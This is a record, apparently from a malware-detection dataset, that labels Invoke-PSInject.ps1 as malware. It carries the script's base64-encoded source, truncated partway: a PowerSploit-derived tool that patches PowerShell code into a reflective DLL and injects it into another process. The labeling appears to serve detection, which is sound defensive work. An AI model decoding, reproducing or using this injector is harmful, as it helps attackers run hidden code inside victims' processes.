Invoke-PSInject.ps1,7ad2c615d605748ad5da0da89689e8f2,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVBTSW5qZWN0CnsKIDwjCi5TWU5PUFNJUwpUYXNrZXMgYSBQb3dlclNoZWxsIHNjcmlwdCBibG9jayAoYmFzZTY0LWVuY29kZWQpLCBwYXRjaGVzCnRoZSBkZWNvZGVkIGxvZ2ljIGludG8gdGhlIGFyY2hpdGVjdHVyZSBhcHByb3ByaWF0ZSBSZWZsZWN0aXZlUGljawouZGxsLCBhbmQgaW5qZWN0cyB0aGUgcmVzdWx0IGludG8gYSBzcGVjaWZpZWQgUHJvY2Vzc0lELgoKQWRhcHRlZCBmcm9tIFBvd2VyU3Bsb2l0J3MgSW52b2tlLVJlZmxlY2l2ZURMTEluamVjdGlvbiBjb2RlYmFzZQoKLlBBUkFNRVRFUiBQcm9jSWQKUHJvY2VzcyB0byBpbmplY3QgUmVmbGVjdGl2ZVBpY2sgaW50bwoKLlBBUkFNRVRFUiBQb3NoQ29kZQpCYXNlNjQtZW5jb2RlZCBQb3dlclNoZWxsIGNvZGUgdG8gaW5qZWN0LgojPgoKCltDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJXZWJGaWxlIildClBhcmFtKAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICBbU3RyaW5nW11dCiAgICAkQ29tcHV0ZXJOYW1lLAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICBbVmFsaWRhdGVTZXQoICdXU3RyaW5nJywgJ1N0cmluZycsICdWb2lkJywgJ090aGVyJyApXQogICAgW1N0cmluZ10KICAgICRGdW5jUmV0dXJuVHlwZSA9ICdPdGhlcicsCiAgICAKICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgIFtTdHJpbmddCiAgICAkRXhlQXJncywKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQpXQogICAgW0ludDMyXQogICAgJFByb2NJZCwKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUpXQogICAgW1N0cmluZ10KICAgICRQcm9jTmFtZSwKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDYsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZUxlbmd0aCgxLDEyMDApXQogICAgW1N0cmluZ10KICAgICRQb3NoQ29kZSwKCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNyldCiAgICBbU3dpdGNoXQogICAgJEZvcmNlQVNMUgopCgogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgoKICAgICMgZGVjb2RlIHRoZSBiYXNlNjQgc2NyaXB0IGJsb2NrCiAgICAkUG9zaENvZGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRQb3NoQ29kZSkpOwoKICAgIGZ1bmN0aW9uIEludm9rZS1QYXRjaERsbCB7CiAgICAgICAgPCMKICAgICAgICAuU1lOT1BTSVMKICAgICAgICBQYXRjaGVzIGEgc3RyaW5nIGluIGEgYmluYXJ5IGJ5dGUgYXJyYXkuCgogICAgICAgIC5QQVJBTUVURVIgRGxsQnl0ZXMKICAgICAgICBCaW5hcnkgYmxvZyB0byBwYXRjaC4KCiAgICAgICAgLlBBUkFNRVRFUiBGaW5kU3RyaW5nCiAgICAgICAgU3RyaW5nIHRvIHNlYXJjaCBmb3IgdG8gcmVwbGFjZS4KCiAgICAgICAgLlBBUkFNRVRFUiBSZXBsYWNlU3RyaW5nCiAgICAgICAgU3RyaW5nIHRvIHJlcGxhY2UgRmluZFN0cmluZyB3aXRoCiAgICAgICAgIz4KCiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtCeXRlW11dCiAgICAgICAgICAgICREbGxCeXRlcywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbc3RyaW5nXQogICAgICAgICAgICAkRmluZFN0cmluZywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbc3RyaW5nXQogICAgICAgICAgICAkUmVwbGFjZVN0cmluZwogICAgICAgICkKCiAgICAgICAgJEZpbmRTdHJpbmdCeXRlcyA9IChbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFKS5HZXRCeXRlcygkRmluZFN0cmluZykKICAgICAgICAkUmVwbGFjZVN0cmluZ0J5dGVzID0gKFtzeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVOSUNPREUpLkdldEJ5dGVzKCRSZXBsYWNlU3RyaW5nKQoKICAgICAgICAkaW5kZXggPSAwCiAgICAgICAgJHMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFLkdldFN0cmluZygkRGxsQnl0ZXMpCiAgICAgICAgJGluZGV4ID0gJHMuSW5kZXhPZigkRmluZFN0cmluZykgKiAyCiAgICAgICAgV3JpdGUtVmVyYm9zZSAicGF0Y2ggaW5kZXg6ICRpbmRleCIKCiAgICAgICAgaWYoJGluZGV4IC1lcSAwKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3coIkNvdWxkIG5vdCBmaW5kIHN0cmluZyAkRmluZFN0cmluZyAhIikKICAgICAgICB9CgogICAgICAgIGZvciAoJGk9MDsgJGkgLWx0ICRSZXBsYWNlU3RyaW5nQnl0ZXMuTGVuZ3RoOyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgJERsbEJ5dGVzWyRpbmRleCskaV09JFJlcGxhY2VTdHJpbmdCeXRlc1skaV0KICAgICAgICB9CgogICAgICAgICMgbnVsbCB0ZXJtaW5hdGUgdGhlIHJlcGxhY2VkIHN0cmluZwogICAgICAgICREbGxCeXRlc1skaW5kZXgrJFJlcGxhY2VTdHJpbmdCeXRlcy5MZW5ndGhdID0gW2J5dGVdMHgwMAogICAgICAgICREbGxCeXRlc1skaW5kZXgrJFJlcGxhY2VTdHJpbmdCeXRlcy5MZW5ndGgrMV0gPSBbYnl0ZV0weDAwCgogICAgICAgICRyZXBsYWNlc3RhcnQgPSAkaW5kZXgKICAgICAgICAkcmVwbGFjZWVuZCA9ICRpbmRleCArICRSZXBsYWNlU3RyaW5nQnl0ZXMuTGVuZ3RoCiAgICAgICAgd3JpdGUtdmVyYm9zZSAicmVwbGFjZXN0YXJ0OiAkcmVwbGFjZXN0YXJ0IgogICAgICAgIHdyaXRlLXZlcmJvc2UgInJlcGxhY2VlbmQ6ICRyZXBsYWNlZW5kIgoKICAgICAgICAkTmV3Q29kZT1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkUmF3Qnl0ZXNbJHJlcGxhY2VzdGFydC4uJHJlcGxhY2VlbmRdKQogICAgICAgIHdyaXRlLXZlcmJvc2UgIlJlcGxhY2VkIHBhdHRlcm4gd2l0aDogJE5ld0NvZGUiCiAgICAgICAgCiAgICAgICAgcmV0dXJuICREbGxCeXRlcwogICAgfQoKCiRSZW1vdGVTY3JpcHRCbG9jayA9IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBFQnl0ZXM2NCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQRUJ5dGVzMzIsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jUmV0dXJuVHlwZSwKICAgICAgICAgICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDMyXQogICAgICAgICRQcm9jSWQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcm9jTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUG9zaENvZGUKICAgICkKICAgIAogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMgIFdpbjMyIFN0dWZmICAjIyMjIyMjIyMjCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgRnVuY3Rpb24gR2V0LVdpbjMyVHlwZXMKICAgIHsKICAgICAgICAkV2luMzJUeXBlcyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoKICAgICAgICAjRGVmaW5lIGFsbCB0aGUgc3RydWN0dXJlcy9lbnVtcyB0aGF0IHdpbGwgYmUgdXNlZAogICAgICAgICMgICBUaGlzIGFydGljbGUgc2hvd3MgeW91IGhvdyB0byBkbyB0aGlzIHdpdGggcmVmbGVjdGlvbjogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMi8wNy9zdHJ1Y3RzLWFuZC1lbnVtcy11c2luZy1yZWZsZWN0aW9uLmh0bWwKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAkRHluYW1pY0Fzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ0R5bmFtaWNBc3NlbWJseScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5hbWljQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnRHluYW1pY01vZHVsZScsICRmYWxzZSkKICAgICAgICAkQ29uc3RydWN0b3JJbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldENvbnN0cnVjdG9ycygpWzBdCgoKICAgICAgICAjIyMjIyMjIyMjIyMgICAgRU5VTSAgICAjIyMjIyMjIyMjIyMKICAgICAgICAjRW51bSBNYWNoaW5lVHlwZQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ01hY2hpbmVUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdOYXRpdmUnLCBbVUludDE2XSAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0kzODYnLCBbVUludDE2XSAweDAxNGMpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSXRhbml1bScsIFtVSW50MTZdIDB4MDIwMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCd4NjQnLCBbVUludDE2XSAweDg2NjQpIHwgT3V0LU51bGwKICAgICAgICAkTWFjaGluZVR5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNYWNoaW5lVHlwZSAtVmFsdWUgJE1hY2hpbmVUeXBlCgogICAgICAgICNFbnVtIE1hZ2ljVHlwZQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ01hZ2ljVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfTlRfT1BUSU9OQUxfSERSMzJfTUFHSUMnLCBbVUludDE2XSAweDEwYikgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9OVF9PUFRJT05BTF9IRFI2NF9NQUdJQycsIFtVSW50MTZdIDB4MjBiKSB8IE91dC1OdWxsCiAgICAgICAgJE1hZ2ljVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1hZ2ljVHlwZSAtVmFsdWUgJE1hZ2ljVHlwZQoKICAgICAgICAjRW51bSBTdWJTeXN0ZW1UeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnU3ViU3lzdGVtVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1VOS05PV04nLCBbVUludDE2XSAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9OQVRJVkUnLCBbVUludDE2XSAxKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0dVSScsIFtVSW50MTZdIDIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfQ1VJJywgW1VJbnQxNl0gMykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fUE9TSVhfQ1VJJywgW1VJbnQxNl0gNykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19DRV9HVUknLCBbVUludDE2XSA5KSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfQVBQTElDQVRJT04nLCBbVUludDE2XSAxMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX0JPT1RfU0VSVklDRV9EUklWRVInLCBbVUludDE2XSAxMSkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX1JVTlRJTUVfRFJJVkVSJywgW1VJbnQxNl0gMTIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9ST00nLCBbVUludDE2XSAxMykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fWEJPWCcsIFtVSW50MTZdIDE0KSB8IE91dC1OdWxsCiAgICAgICAgJFN1YlN5c3RlbVR5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTdWJTeXN0ZW1UeXBlIC1WYWx1ZSAkU3ViU3lzdGVtVHlwZQoKICAgICAgICAjRW51bSBEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzAnLCBbVUludDE2XSAweDAwMDEpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzEnLCBbVUludDE2XSAweDAwMDIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzInLCBbVUludDE2XSAweDAwMDQpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzMnLCBbVUludDE2XSAweDAwMDgpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UnLCBbVUludDE2XSAweDAwNDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19GT1JDRV9JTlRFR1JJVFknLCBbVUludDE2XSAweDAwODApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19OWF9DT01QQVQnLCBbVUludDE2XSAweDAxMDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX0lTT0xBVElPTicsIFtVSW50MTZdIDB4MDIwMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fU0VIJywgW1VJbnQxNl0gMHgwNDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19CSU5EJywgW1VJbnQxNl0gMHgwODAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU180JywgW1VJbnQxNl0gMHgxMDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19XRE1fRFJJVkVSJywgW1VJbnQxNl0gMHgyMDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19URVJNSU5BTF9TRVJWRVJfQVdBUkUnLCBbVUludDE2XSAweDgwMDApIHwgT3V0LU51bGwKICAgICAgICAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERsbENoYXJhY3RlcmlzdGljc1R5cGUgLVZhbHVlICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlCgogICAgICAgICMjIyMjIyMjIyMjICAgIFNUUlVDVCAgICAjIyMjIyMjIyMjIwogICAgICAgICNTdHJ1Y3QgSU1BR0VfREFUQV9ESVJFQ1RPUlkKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9EQVRBX0RJUkVDVE9SWScsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9EQVRBX0RJUkVDVE9SWSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RBVEFfRElSRUNUT1JZIC1WYWx1ZSAkSU1BR0VfREFUQV9ESVJFQ1RPUlkKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9GSUxFX0hFQURFUgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfRklMRV9IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hY2hpbmUnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mU2VjdGlvbnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RpbWVEYXRlU3RhbXAnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1N5bWJvbFRhYmxlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlN5bWJvbHMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZk9wdGlvbmFsSGVhZGVyJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfRklMRV9IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9GSUxFX0hFQURFUiAtVmFsdWUgJElNQUdFX0ZJTEVfSEVBREVSCgogICAgICAgICNTdHJ1Y3QgSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9PUFRJT05BTF9IRUFERVI2NCcsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDI0MCkKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWdpYycsICRNYWdpY1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlVuaW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mRW50cnlQb2ludCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJbWFnZUJhc2UnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTZWN0aW9uQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS